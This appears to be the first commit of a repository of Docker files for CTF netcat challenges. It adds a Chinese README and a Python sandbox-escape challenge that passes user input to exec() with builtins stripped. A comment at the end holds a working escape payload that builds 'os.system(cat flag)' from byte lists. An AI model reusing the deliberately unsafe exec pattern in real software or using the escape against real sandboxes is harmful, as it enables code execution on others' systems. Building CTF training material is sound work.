3ed192f2fe7547f111aeb267816497e11296df6a
GZTime <du_du_waw@163.com>
2021-05-21 21:22:29 +0800

    first commit

---
+++ README.md
@@ -0,0 +1,16 @@
+## netcat-doceker
+
+CTF中netcat题目有关docker的相关构造文件。
+
+从简单到复杂的docker构造文件逐渐更新，目前进度：
+
+- 直接可以访问
+  - `build_yourself_in`
+    一道python沙箱逃逸题目，运行时将有限制的python终端暴露给连接方。
+    默认连接：`nc 127.0.0.1 65101`
+
+  - `tictactoe`
+    Hackergame2020题目，pwn题目类型。
+    默认连接：`nc 127.0.0.1 65102`
+
+- 后期更新...
---
+++ build_yourself_in/program.py
@@ -0,0 +1,25 @@
+#!/usr/bin/python3.8
+#coding=utf8
+from sys import version
+import os
+
+os.chdir('/home/ctf/')
+
+def main():
+    print(f'{version}\n')
+    print('[*] Only aliens are allowed!\n')
+    for _ in range(10):
+        text = input('>>> ').lower()
+        if "'" in text or '"' in text:
+            print('No quotes are allowed! \n\nExiting..\n')
+            break
+        else:
+            exec(text, {'__builtins__': None, 'print':print})
+
+if __name__ == "__main__":
+    main()
+
+
+'''
+print(({}.__class__.__base__.__subclasses__()[94].__init__.__globals__[{}.__class__.__base__.__subclasses__()[6]([95, 95, 98, 117, 105, 108, 116, 105, 110, 115, 95, 95]).decode()])[{}.__class__.__base__.__subclasses__()[6]([95, 95, 105, 109, 112, 111, 114, 116, 95, 95]).decode()]({}.__class__.__base__.__subclasses__()[6]([111, 115]).decode()).__dict__[{}.__class__.__base__.__subclasses__()[6]([115, 121, 115, 116, 101, 109]).decode()]({}.__class__.__base__.__subclasses__()[6]([99, 97, 116, 32, 102, 108, 97, 103]).decode()))
+'''
